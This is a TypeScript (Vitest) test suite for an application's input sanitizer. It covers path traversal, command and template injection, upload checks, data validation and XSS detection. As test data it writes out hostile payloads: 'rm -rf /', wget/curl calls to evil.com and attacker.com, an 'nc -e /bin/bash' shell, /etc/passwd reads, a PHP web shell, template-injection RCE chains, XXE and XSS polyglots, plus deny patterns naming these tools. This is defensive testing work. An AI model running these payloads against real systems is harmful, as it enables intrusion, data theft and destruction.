/**
 * General Input Validation Security Tests
 * 
 * Comprehensive tests for input validation security including:
 * - Path traversal prevention
 * - Command injection protection
 * - File upload security
 * - Data type validation
 * - Length and size limits
 * - Special character handling
 * - Malicious payload detection
 */

import { describe, it, expect, beforeEach, vi } from 'vitest'
import { SecurityTestDataGenerator, SecurityTestHelpers } from '../utils/security-test-utils'
import { sanitizeInput, validateInput } from '@/src/lib/security-config'

import { 
  setupTimeoutElimination, 
  withTimeout, 
  TIMEOUT_CONFIG,
  flushPromises 
} from '../../utils/timeout-elimination-helpers';

describe('Input Validation Security Tests', () => {
  beforeEach(() => {
    vi.clearAllMocks()
  })

  describe('Path Traversal Prevention', () => {
    it('should prevent directory traversal attacks', () => {
      const pathTraversalPayloads = SecurityTestDataGenerator.generatePathTraversalPayloads()
      
      for (const payload of pathTraversalPayloads) {
        const sanitized = sanitizeInput(payload)
        
        // Should not contain path traversal sequences
        expect(sanitized).not.toMatch(/\.\.\//g)
        expect(sanitized).not.toMatch(/\.\.\\/g)
        expect(sanitized).not.toMatch(/\.\.%2f/gi)
        expect(sanitized).not.toMatch(/\.\.%5c/gi)
        expect(sanitized).not.toMatch(/\.\.%252f/gi)
        expect(sanitized).not.toMatch(/\.\.%255c/gi)
        expect(sanitized).not.toMatch(/\.\./g)
      }
    })

    it('should validate file path inputs', () => {
      const filePathInputs = [
        { input: 'document.pdf', isValid: true },
        { input: 'folder/document.pdf', isValid: true },
        { input: '../../../etc/passwd', isValid: false },
        { input: '..\\..\\..\\windows\\system32\\config\\sam', isValid: false },
        { input: '/var/www/../../etc/passwd', isValid: false },
        { input: 'C:\\inetpub\\wwwroot\\..\\..\\..\\windows\\system32', isValid: false },
        { input: 'file://etc/passwd', isValid: false },
        { input: 'http://evil.com/malware.exe', isValid: false }
      ]

      for (const testCase of filePathInputs) {
        const sanitized = sanitizeInput(testCase.input)
        const isValid = !sanitized.includes('..') && 
                       !sanitized.includes('etc/passwd') &&
                       !sanitized.includes('windows/system32') &&
                       !sanitized.includes('file://') &&
                       !sanitized.startsWith('http')

        if (testCase.isValid) {
          expect(isValid).toBe(true)
        } else {
          expect(isValid).toBe(false)
        }
      }
    })

    it('should handle encoded path traversal attempts', () => {
      const encodedPathTraversals = [
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', // ../../../etc/passwd
        '%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32', // ..\..\..\windows\system32
        '..%252f..%252f..%252fetc%252fpasswd', // Double encoded
        '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd', // UTF-8 overlong encoding
        '..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd' // More overlong encoding
      ]

      for (const encoded of encodedPathTraversals) {
        const decoded = decodeURIComponent(encoded)
        const sanitized = sanitizeInput(decoded)
        
        expect(sanitized).not.toMatch(/\.\./g)
        expect(sanitized).not.toMatch(/etc\/passwd/i)
        expect(sanitized).not.toMatch(/windows\\system32/i)
      }
    })

    it('should prevent null byte injection', () => {
      const nullBytePayloads = [
        'document.pdf\0.jpg',
        'safe.txt\0../../etc/passwd',
        'upload.png\0<?php system($_GET["cmd"]); ?>',
        'file.doc\0\0\0malicious.exe',
        'image.gif\0<script>alert("XSS")</script>'
      ]

      for (const payload of nullBytePayloads) {
        const sanitized = sanitizeInput(payload)
        
        expect(sanitized).not.toContain('\0')
        expect(sanitized).not.toMatch(/\.\./g)
        expect(sanitized).not.toMatch(/<\?php/i)
        expect(sanitized).not.toMatch(/<script/i)
      }
    })

    it('should validate file extension security', () => {
      const fileExtensionTests = [
        { filename: 'document.pdf', isAllowed: true },
        { filename: 'image.jpg', isAllowed: true },
        { filename: 'data.csv', isAllowed: true },
        { filename: 'script.js', isAllowed: false },
        { filename: 'shell.php', isAllowed: false },
        { filename: 'malware.exe', isAllowed: false },
        { filename: 'config.bat', isAllowed: false },
        { filename: 'hack.sh', isAllowed: false },
        { filename: 'virus.scr', isAllowed: false },
        { filename: 'trojan.pif', isAllowed: false }
      ]

      const allowedExtensions = ['.pdf', '.jpg', '.jpeg', '.png', '.gif', '.txt', '.csv', '.doc', '.docx']

      for (const test of fileExtensionTests) {
        const extension = '.' + test.filename.split('.').pop()?.toLowerCase()
        const isAllowed = allowedExtensions.includes(extension)
        
        expect(isAllowed).toBe(test.isAllowed)
      }
    })
  })

  describe('Command Injection Prevention', () => {
    it('should prevent OS command injection', () => {
      const commandInjectionPayloads = [
        'file.txt; rm -rf /',
        'document.pdf && format c:',
        'image.jpg | cat /etc/passwd',
        'data.csv; wget http://evil.com/malware.sh',
        'file.txt & del *.*',
        'doc.pdf; curl http://attacker.com/steal-data.php',
        'image.png; nc -l 1234 -e /bin/bash',
        'file.txt; python -c "import os; os.system(\'ls\')"',
        'data.csv; perl -e "system(\'whoami\')"',
        'document.pdf; powershell.exe -Command "Get-Process"'
      ]

      for (const payload of commandInjectionPayloads) {
        const sanitized = sanitizeInput(payload)
        
        expect(sanitized).not.toMatch(/;\s*rm/i)
        expect(sanitized).not.toMatch(/;\s*del/i)
        expect(sanitized).not.toMatch(/;\s*format/i)
        expect(sanitized).not.toMatch(/;\s*wget/i)
        expect(sanitized).not.toMatch(/;\s*curl/i)
        expect(sanitized).not.toMatch(/;\s*nc/i)
        expect(sanitized).not.toMatch(/;\s*python/i)
        expect(sanitized).not.toMatch(/;\s*perl/i)
        expect(sanitized).not.toMatch(/;\s*powershell/i)
        expect(sanitized).not.toMatch(/\|/)
        expect(sanitized).not.toMatch(/&/)
        expect(sanitized).not.toMatch(/`/)
        expect(sanitized).not.toMatch(/\$\(/g)
      }
    })

    it('should prevent shell metacharacter abuse', () => {
      const shellMetacharacters = [
        'command`whoami`',
        'file$(cat /etc/passwd)',
        'data;cat /etc/hosts',
        'file|base64 /etc/passwd',
        'doc&&echo hacked',
        'file||echo vulnerable',
        'data>output.txt',
        'file<input.txt',
        'doc 2>&1',
        'file&background',
        'data\\escaped',
        'file"quoted"',
        "file'quoted'",
        'file*wildcard',
        'file?wildcard',
        'file[range]',
        'file{expansion}',
        'file~home',
        'file#comment'
      ]

      for (const payload of shellMetacharacters) {
        const sanitized = sanitizeInput(payload)
        
        expect(sanitized).not.toMatch(/`/)
        expect(sanitized).not.toMatch(/\$\(/g)
        expect(sanitized).not.toMatch(/;/)
        expect(sanitized).not.toMatch(/\|/)
        expect(sanitized).not.toMatch(/&&/)
        expect(sanitized).not.toMatch(/\|\|/)
        expect(sanitized).not.toMatch(/>/)
        expect(sanitized).not.toMatch(/</)
        expect(sanitized).not.toMatch(/&/)
        expect(sanitized).not.toMatch(/\\/)
        expect(sanitized).not.toMatch(/\*/)
        expect(sanitized).not.toMatch(/\?/)
        expect(sanitized).not.toMatch(/\[/)
        expect(sanitized).not.toMatch(/\]/)
        expect(sanitized).not.toMatch(/\{/)
        expect(sanitized).not.toMatch(/\}/)
        expect(sanitized).not.toMatch(/~/)
        expect(sanitized).not.toMatch(/#/)
      }
    })

    it('should prevent template injection', () => {
      const templateInjectionPayloads = [
        '{{7*7}}',
        '${7*7}',
        '<%=7*7%>',
        '{%exec "ls"%}',
        '{{config.items()}}',
        '${T(java.lang.Runtime).getRuntime().exec("calc")}',
        '{{request.application.__globals__.__builtins__.__import__("os").system("ls")}}',
        '#set($x="")#set($rt=$x.class.forName("java.lang.Runtime"))#set($chr=$x.class.forName("java.lang.Character"))#set($str=$x.class.forName("java.lang.String"))#$rt.getRuntime().exec("calc")',
        '<%= system("ls") %>',
        '{{constructor.constructor("return process")().exit()}}'
      ]

      for (const payload of templateInjectionPayloads) {
        const sanitized = sanitizeInput(payload)
        
        expect(sanitized).not.toMatch(/\{\{.*\}\}/g)
        expect(sanitized).not.toMatch(/\$\{.*\}/g)
        expect(sanitized).not.toMatch(/<%.*%>/g)
        expect(sanitized).not.toMatch(/\{%.*%\}/g)
        expect(sanitized).not.toMatch(/constructor/i)
        expect(sanitized).not.toMatch(/forName/i)
        expect(sanitized).not.toMatch(/getRuntime/i)
        expect(sanitized).not.toMatch(/exec/i)
        expect(sanitized).not.toMatch(/system/i)
        expect(sanitized).not.toMatch(/__globals__/i)
        expect(sanitized).not.toMatch(/__builtins__/i)
        expect(sanitized).not.toMatch(/__import__/i)
      }
    })
  })

  describe('File Upload Security', () => {
    it('should validate file upload content', () => {
      const maliciousFileContents = [
        { name: 'innocent.jpg', content: '<?php system($_GET["cmd"]); ?>', type: 'php_in_image' },
        { name: 'document.pdf', content: '<script>alert("XSS")</script>', type: 'xss_in_pdf' },
        { name: 'data.csv', content: '=cmd|"/c calc"!A1', type: 'csv_injection' },
        { name: 'config.xml', content: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', type: 'xxe_attack' },
        { name: 'archive.zip', content: '../../../evil.php', type: 'zip_slip' },
        { name: 'image.svg', content: '<svg onload="alert(1)"><script>alert(2)</script></svg>', type: 'svg_xss' }
      ]

      for (const file of maliciousFileContents) {
        const sanitizedName = sanitizeInput(file.name)
        const sanitizedContent = sanitizeInput(file.content)
        
        expect(sanitizedContent).not.toMatch(/<\?php/i)
        expect(sanitizedContent).not.toMatch(/<script/i)
        expect(sanitizedContent).not.toMatch(/=cmd\|/i)
        expect(sanitizedContent).not.toMatch(/<!DOCTYPE/i)
        expect(sanitizedContent).not.toMatch(/<!ENTITY/i)
        expect(sanitizedContent).not.toMatch(/SYSTEM/i)
        expect(sanitizedContent).not.toMatch(/\.\.\//g)
        expect(sanitizedContent).not.toMatch(/onload=/i)
      }
    })

    it('should validate file size limits', () => {
      const fileSizeTests = [
        { size: 1024, limit: 1048576, isValid: true }, // 1KB < 1MB
        { size: 1048576, limit: 1048576, isValid: true }, // 1MB = 1MB
        { size: 2097152, limit: 1048576, isValid: false }, // 2MB > 1MB
        { size: 104857600, limit: 1048576, isValid: false }, // 100MB > 1MB
        { size: 0, limit: 1048576, isValid: false }, // 0 bytes
        { size: -1, limit: 1048576, isValid: false } // Negative size
      ]

      for (const test of fileSizeTests) {
        const isValid = test.size > 0 && test.size <= test.limit
        expect(isValid).toBe(test.isValid)
      }
    })

    it('should validate MIME type security', () => {
      const mimeTypeTests = [
        { file: 'document.pdf', claimed: 'application/pdf', actual: 'application/pdf', isValid: true },
        { file: 'image.jpg', claimed: 'image/jpeg', actual: 'image/jpeg', isValid: true },
        { file: 'shell.php', claimed: 'image/jpeg', actual: 'application/x-php', isValid: false },
        { file: 'malware.exe', claimed: 'text/plain', actual: 'application/x-executable', isValid: false },
        { file: 'script.js', claimed: 'application/pdf', actual: 'application/javascript', isValid: false },
        { file: 'virus.scr', claimed: 'image/png', actual: 'application/x-msdownload', isValid: false }
      ]

      for (const test of mimeTypeTests) {
        const mimeTypeMatches = test.claimed === test.actual
        const isSafeMimeType = ['application/pdf', 'image/jpeg', 'image/png', 'image/gif', 'text/plain'].includes(test.actual)
        const isValid = mimeTypeMatches && isSafeMimeType
        
        expect(isValid).toBe(test.isValid)
      }
    })

    it('should prevent malicious filenames', () => {
      const maliciousFilenames = SecurityTestDataGenerator.generateMaliciousFilenames()
      
      for (const filename of maliciousFilenames) {
        const sanitized = sanitizeInput(filename)
        
        expect(sanitized).not.toMatch(/\.\./g)
        expect(sanitized).not.toMatch(/\//)
        expect(sanitized).not.toMatch(/\\/)
        expect(sanitized).not.toMatch(/</g)
        expect(sanitized).not.toMatch(/>/g)
        expect(sanitized).not.toMatch(/\|/)
        expect(sanitized).not.toMatch(/&/)
        expect(sanitized).not.toMatch(/;/)
        expect(sanitized).not.toMatch(/`/)
        expect(sanitized).not.toMatch(/\$/)
        expect(sanitized).not.toMatch(/\*/)
        expect(sanitized).not.toMatch(/\?/)
      }
    })

    it('should validate file header signatures', () => {
      const fileSignatures = [
        { extension: '.pdf', signature: '%PDF-1.', isValid: true },
        { extension: '.jpg', signature: '\xFF\xD8\xFF', isValid: true },
        { extension: '.png', signature: '\x89\x50\x4E\x47', isValid: true },
        { extension: '.gif', signature: 'GIF87a', isValid: true },
        { extension: '.zip', signature: 'PK\x03\x04', isValid: true },
        { extension: '.pdf', signature: '\xFF\xD8\xFF', isValid: false }, // JPEG header in PDF
        { extension: '.jpg', signature: '%PDF-1.', isValid: false }, // PDF header in JPG
        { extension: '.png', signature: 'GIF87a', isValid: false }, // GIF header in PNG
        { extension: '.txt', signature: 'MZ', isValid: false } // EXE header in TXT
      ]

      for (const test of fileSignatures) {
        const signatureMatches = test.extension === '.pdf' && test.signature.startsWith('%PDF') ||
                               test.extension === '.jpg' && test.signature.includes('\xFF\xD8') ||
                               test.extension === '.png' && test.signature.includes('\x89PNG') ||
                               test.extension === '.gif' && test.signature.startsWith('GIF') ||
                               test.extension === '.zip' && test.signature.startsWith('PK')

        expect(signatureMatches).toBe(test.isValid)
      }
    })
  })

  describe('Data Type Validation', () => {
    it('should validate numeric inputs', () => {
      const numericTests = [
        { input: '123', isValid: true },
        { input: '123.45', isValid: true },
        { input: '-123.45', isValid: true },
        { input: '0', isValid: true },
        { input: '123abc', isValid: false },
        { input: 'abc123', isValid: false },
        { input: '123; DROP TABLE users', isValid: false },
        { input: '123<script>alert(1)</script>', isValid: false },
        { input: 'NaN', isValid: false },
        { input: 'Infinity', isValid: false },
        { input: '', isValid: false },
        { input: null, isValid: false }
      ]

      for (const test of numericTests) {
        const isValid = test.input !== null && 
                       test.input !== '' && 
                       !isNaN(Number(test.input)) && 
                       isFinite(Number(test.input)) &&
                       /^-?\d+(\.\d+)?$/.test(test.input)

        expect(isValid).toBe(test.isValid)
      }
    })

    it('should validate email inputs', () => {
      const emailTests = [
        { input: 'user@example.com', isValid: true },
        { input: 'test.email@domain.co.uk', isValid: true },
        { input: 'user+tag@example.com', isValid: true },
        { input: 'invalid.email', isValid: false },
        { input: 'user@', isValid: false },
        { input: '@domain.com', isValid: false },
        { input: 'user@domain', isValid: false },
        { input: 'user@domain.', isValid: false },
        { input: 'user<script>alert(1)</script>@domain.com', isValid: false },
        { input: 'user@domain.com<script>alert(1)</script>', isValid: false },
        { input: "user'; DROP TABLE users; --@domain.com", isValid: false },
        { input: 'user@domain.com\0malicious', isValid: false }
      ]

      for (const test of emailTests) {
        const emailRegex = /^[^\s@<>]+@[^\s@<>]+\.[^\s@<>]+$/
        const containsMalicious = test.input.includes('<') || 
                                test.input.includes('>') || 
                                test.input.includes(';') || 
                                test.input.includes('\0') ||
                                test.input.includes('--')

        const isValid = emailRegex.test(test.input) && !containsMalicious
        expect(isValid).toBe(test.isValid)
      }
    })

    it('should validate URL inputs', () => {
      const urlTests = [
        { input: 'https://example.com', isValid: true },
        { input: 'http://localhost:3000', isValid: true },
        { input: 'https://api.mexc.com/api/v3', isValid: true },
        { input: 'ftp://files.example.com', isValid: false },
        { input: 'javascript:alert(1)', isValid: false },
        { input: 'data:text/html,<script>alert(1)</script>', isValid: false },
        { input: 'file:///etc/passwd', isValid: false },
        { input: 'vbscript:msgbox(1)', isValid: false },
        { input: 'https://evil.com/malware.exe', isValid: false },
        { input: 'http://192.168.1.1/admin', isValid: false }
      ]

      for (const test of urlTests) {
        const isValidProtocol = test.input.startsWith('http://') || test.input.startsWith('https://')
        const isSafeDomain = !test.input.includes('evil.com') && 
                           !test.input.includes('192.168.') && 
                           !test.input.includes('malware')
        const isNotMalicious = !test.input.includes('javascript:') && 
                              !test.input.includes('data:') && 
                              !test.input.includes('file:') && 
                              !test.input.includes('vbscript:')

        const isValid = isValidProtocol && isSafeDomain && isNotMalicious
        expect(isValid).toBe(test.isValid)
      }
    })

    it('should validate trading symbol inputs', () => {
      const symbolTests = [
        { input: 'BTCUSDT', isValid: true },
        { input: 'ETHBTC', isValid: true },
        { input: 'ADAUSDT', isValid: true },
        { input: 'btcusdt', isValid: false }, // Should be uppercase
        { input: 'BTC-USDT', isValid: false }, // Should not contain hyphens
        { input: 'BTC_USDT', isValid: false }, // Should not contain underscores
        { input: 'BTC USDT', isValid: false }, // Should not contain spaces
        { input: 'BTC<script>alert(1)</script>USDT', isValid: false },
        { input: "BTC'; DROP TABLE orders; --USDT", isValid: false },
        { input: 'BTC\0USDT', isValid: false }
      ]

      for (const test of symbolTests) {
        const symbolRegex = /^[A-Z0-9]{2,20}$/
        const isValid = symbolRegex.test(test.input)
        expect(isValid).toBe(test.isValid)
      }
    })

    it('should validate JSON inputs', () => {
      const jsonTests = [
        { input: '{"key": "value"}', isValid: true },
        { input: '{"number": 123}', isValid: true },
        { input: '{"array": [1, 2, 3]}', isValid: true },
        { input: '{"nested": {"object": true}}', isValid: true },
        { input: 'invalid json', isValid: false },
        { input: '{"key": "value",}', isValid: false }, // Trailing comma
        { input: '{"key": undefined}', isValid: false }, // Undefined value
        { input: '{"constructor": {"constructor": "alert(1)"}}', isValid: false },
        { input: '{"__proto__": {"isAdmin": true}}', isValid: false },
        { input: '{"eval": "alert(1)"}', isValid: false }
      ]

      for (const test of jsonTests) {
        let isValid = false
        try {
          const parsed = JSON.parse(test.input)
          const jsonString = JSON.stringify(parsed)
          
          // Check for dangerous properties
          const hasDangerousProps = jsonString.includes('constructor') ||
                                   jsonString.includes('__proto__') ||
                                   jsonString.includes('eval') ||
                                   jsonString.includes('function') ||
                                   jsonString.includes('alert')

          isValid = !hasDangerousProps
        } catch (error) {
          isValid = false
        }
        
        expect(isValid).toBe(test.isValid)
      }
    })
  })

  describe('Length and Size Limits', () => {
    it('should enforce string length limits', () => {
      const lengthTests = [
        { input: 'short', maxLength: 10, isValid: true },
        { input: 'exactly10c', maxLength: 10, isValid: true },
        { input: 'toolongstring', maxLength: 10, isValid: false },
        { input: 'a'.repeat(1000), maxLength: 100, isValid: false },
        { input: '', maxLength: 10, isValid: true }, // Empty string is valid
        { input: 'normal length', maxLength: 20, isValid: true }
      ]

      for (const test of lengthTests) {
        const isValid = test.input.length <= test.maxLength
        expect(isValid).toBe(test.isValid)
      }
    })

    it('should enforce array size limits', () => {
      const arraySizeTests = [
        { input: [1, 2, 3], maxSize: 5, isValid: true },
        { input: [1, 2, 3, 4, 5], maxSize: 5, isValid: true },
        { input: [1, 2, 3, 4, 5, 6], maxSize: 5, isValid: false },
        { input: [], maxSize: 5, isValid: true },
        { input: new Array(1000).fill(1), maxSize: 100, isValid: false }
      ]

      for (const test of arraySizeTests) {
        const isValid = test.input.length <= test.maxSize
        expect(isValid).toBe(test.isValid)
      }
    })

    it('should enforce object depth limits', () => {
      const depthTests = [
        { input: { a: 1 }, maxDepth: 3, isValid: true },
        { input: { a: { b: 2 } }, maxDepth: 3, isValid: true },
        { input: { a: { b: { c: 3 } } }, maxDepth: 3, isValid: true },
        { input: { a: { b: { c: { d: 4 } } } }, maxDepth: 3, isValid: false }
      ]

      function getObjectDepth(obj: any, depth = 0): number {
        if (typeof obj !== 'object' || obj === null) return depth
        
        let maxDepth = depth
        for (const key in obj) {
          if (obj.hasOwnProperty(key)) {
            const currentDepth = getObjectDepth(obj[key], depth + 1)
            maxDepth = Math.max(maxDepth, currentDepth)
          }
        }
        return maxDepth
      }

      for (const test of depthTests) {
        const actualDepth = getObjectDepth(test.input)
        const isValid = actualDepth <= test.maxDepth
        expect(isValid).toBe(test.isValid)
      }
    })

    it('should enforce property count limits', () => {
      const propertyCountTests = [
        { input: { a: 1, b: 2 }, maxProperties: 5, isValid: true },
        { input: { a: 1, b: 2, c: 3, d: 4, e: 5 }, maxProperties: 5, isValid: true },
        { input: { a: 1, b: 2, c: 3, d: 4, e: 5, f: 6 }, maxProperties: 5, isValid: false },
        { input: {}, maxProperties: 5, isValid: true }
      ]

      for (const test of propertyCountTests) {
        const propertyCount = Object.keys(test.input).length
        const isValid = propertyCount <= test.maxProperties
        expect(isValid).toBe(test.isValid)
      }
    })
  })

  describe('Special Character Handling', () => {
    it('should handle Unicode normalization', () => {
      const unicodeTests = [
        'café', // Normal
        'cafe\u0301', // Composed
        'caf\u00e9', // Precomposed
        '\u0041\u0300', // A with grave accent
        '\u00c0', // À (precomposed)
        'Ω', // Greek capital omega
        'Ω', // Mathematical omega symbol (different code point)
      ]

      for (const test of unicodeTests) {
        const normalized = test.normalize('NFC')
        const sanitized = sanitizeInput(normalized)
        
        // Should still be valid after normalization and sanitization
        expect(sanitized).toBeTruthy()
        expect(typeof sanitized).toBe('string')
      }
    })

    it('should handle control characters', () => {
      const controlCharacterTests = [
        'normal text',
        'text\x00with\x00nulls', // Null bytes
        'text\x01with\x02control\x03chars', // Control characters
        'text\rwith\nlinebreaks\t', // Line breaks and tabs
        'text\x7Fwith\x80extended\xFF', // Extended ASCII
        'text\u2028with\u2029unicode\u0085separators' // Unicode separators
      ]

      for (const test of controlCharacterTests) {
        const sanitized = sanitizeInput(test)
        
        // Should not contain null bytes or dangerous control characters
        expect(sanitized).not.toContain('\x00')
        expect(sanitized).not.toContain('\x01')
        expect(sanitized).not.toContain('\x02')
        expect(sanitized).not.toContain('\x03')
        expect(sanitized).not.toContain('\x7F')
        expect(sanitized).not.toContain('\u2028')
        expect(sanitized).not.toContain('\u2029')
        expect(sanitized).not.toContain('\u0085')
      }
    })

    it('should handle bidirectional text attacks', () => {
      const bidiTests = [
        'normaltext',
        'text\u202Ereversed\u202D', // Right-to-left override
        'text\u200Fhidden\u200E', // Right-to-left mark
        'file\u202Etxt.exe', // Hidden file extension
        'admin\u202E\u200Fuser', // Hidden username
        'safe\u061C\u200Ftext' // Arabic letter mark
      ]

      for (const test of bidiTests) {
        const sanitized = sanitizeInput(test)
        
        // Should not contain bidirectional control characters
        expect(sanitized).not.toContain('\u202E') // Right-to-left override
        expect(sanitized).not.toContain('\u202D') // Left-to-right override
        expect(sanitized).not.toContain('\u200F') // Right-to-left mark
        expect(sanitized).not.toContain('\u200E') // Left-to-right mark
        expect(sanitized).not.toContain('\u061C') // Arabic letter mark
      }
    })

    it('should handle homograph attacks', () => {
      const homographTests = [
        'admin', // Normal
        'аdmin', // Cyrillic 'а'
        'аdmіn', // Mixed Cyrillic
        'раyраl.com', // Cyrillic lookalikes
        'аррӏе.com', // Apple with Cyrillic
        'microsоft.com', // Microsoft with Cyrillic
        'gооglе.com' // Google with Cyrillic
      ]

      for (const test of homographTests) {
        const sanitized = sanitizeInput(test)
        
        // Should detect and handle suspicious character combinations
        const hasLatinAndCyrillic = /[a-zA-Z]/.test(test) && /[\u0400-\u04FF]/.test(test)
        
        if (hasLatinAndCyrillic) {
          // Mixed scripts should be flagged or normalized
          expect(sanitized).not.toBe(test) // Should be modified
        }
      }
    })
  })

  describe('Malicious Payload Detection', () => {
    it('should detect payload encoding attempts', () => {
      const encodingTests = [
        { payload: 'alert(1)', encoding: 'none', isDetected: true },
        { payload: 'YWxlcnQoMSk=', encoding: 'base64', isDetected: true }, // alert(1)
        { payload: '%61%6c%65%72%74%28%31%29', encoding: 'url', isDetected: true },
        { payload: '&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;', encoding: 'html', isDetected: true },
        { payload: '\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029', encoding: 'unicode', isDetected: true }
      ]

      for (const test of encodingTests) {
        let decoded = test.payload

        // Decode based on encoding type
        if (test.encoding === 'base64') {
          try {
            decoded = atob(test.payload)
          } catch {
            decoded = test.payload
          }
        } else if (test.encoding === 'url') {
          decoded = decodeURIComponent(test.payload)
        } else if (test.encoding === 'html') {
          decoded = test.payload.replace(/&#(\d+);/g, (match, dec) => String.fromCharCode(dec))
        } else if (test.encoding === 'unicode') {
          decoded = test.payload.replace(/\\u([0-9a-f]{4})/gi, (match, hex) => String.fromCharCode(parseInt(hex, 16)))
        }

        const sanitized = sanitizeInput(decoded)
        const isDetected = !sanitized.includes('alert') && !sanitized.includes('(1)')
        
        expect(isDetected).toBe(test.isDetected)
      }
    })

    it('should detect obfuscation techniques', () => {
      const obfuscationTests = [
        'eval("alert(1)")',
        'window["eval"]("alert(1)")',
        'this["constructor"]["constructor"]("alert(1)")()',
        'Function("alert(1)")()',
        'setTimeout("alert(1)", 0)',
        'setInterval("alert(1)", 0)',
        'document.write("<script>alert(1)</script>")',
        'document.createElement("script").src = "javascript:alert(1)"',
        '[]["constructor"]["constructor"]("alert(1)")()',
        'String.fromCharCode(97,108,101,114,116,40,49,41)'
      ]

      for (const payload of obfuscationTests) {
        const sanitized = sanitizeInput(payload)
        
        expect(sanitized).not.toMatch(/eval\s*\(/i)
        expect(sanitized).not.toMatch(/constructor/i)
        expect(sanitized).not.toMatch(/Function\s*\(/i)
        expect(sanitized).not.toMatch(/setTimeout/i)
        expect(sanitized).not.toMatch(/setInterval/i)
        expect(sanitized).not.toMatch(/document\.write/i)
        expect(sanitized).not.toMatch(/document\.createElement/i)
        expect(sanitized).not.toMatch(/fromCharCode/i)
        expect(sanitized).not.toMatch(/alert/i)
      }
    })

    it('should detect polyglot payloads', () => {
      const polyglotPayloads = [
        'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
        '">><marquee><img src=x onerror=confirm(1)></marquee>">',
        '<%<!--\'/*--><h1>XSS</h1>--></script>',
        '--><script>alert(String.fromCharCode(88,83,83))</script>',
        '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\';alert(String.fromCharCode(88,83,83))//\'</SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>'
      ]

      for (const payload of polyglotPayloads) {
        const sanitized = sanitizeInput(payload)
        
        expect(sanitized).not.toMatch(/javascript:/i)
        expect(sanitized).not.toMatch(/<script/i)
        expect(sanitized).not.toMatch(/<svg/i)
        expect(sanitized).not.toMatch(/<img/i)
        expect(sanitized).not.toMatch(/<marquee/i)
        expect(sanitized).not.toMatch(/onload=/i)
        expect(sanitized).not.toMatch(/onerror=/i)
        expect(sanitized).not.toMatch(/onmouseover=/i)
        expect(sanitized).not.toMatch(/alert/i)
        expect(sanitized).not.toMatch(/confirm/i)
        expect(sanitized).not.toMatch(/fromCharCode/i)
      }
    })

    it('should detect mutation XSS attempts', () => {
      const mutationXSSPayloads = [
        '<img src="x" onerror="alert(1)">',
        '<svg><script>alert(1)</script></svg>',
        '<math><mi><script>alert(1)</script></mi></math>',
        '<table><tbody><tr><td><script>alert(1)</script></td></tr></tbody></table>',
        '<div><p><span><script>alert(1)</script></span></p></div>',
        '<form><input type="hidden" value="<script>alert(1)</script>">',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<object data="javascript:alert(1)"></object>',
        '<embed src="javascript:alert(1)">',
        '<link rel="stylesheet" href="javascript:alert(1)">'
      ]

      for (const payload of mutationXSSPayloads) {
        const sanitized = sanitizeInput(payload)
        
        expect(sanitized).not.toMatch(/<img/i)
        expect(sanitized).not.toMatch(/<svg/i)
        expect(sanitized).not.toMatch(/<math/i)
        expect(sanitized).not.toMatch(/<script/i)
        expect(sanitized).not.toMatch(/<iframe/i)
        expect(sanitized).not.toMatch(/<object/i)
        expect(sanitized).not.toMatch(/<embed/i)
        expect(sanitized).not.toMatch(/<link/i)
        expect(sanitized).not.toMatch(/javascript:/i)
        expect(sanitized).not.toMatch(/onerror=/i)
        expect(sanitized).not.toMatch(/alert/i)
      }
    })
  })
})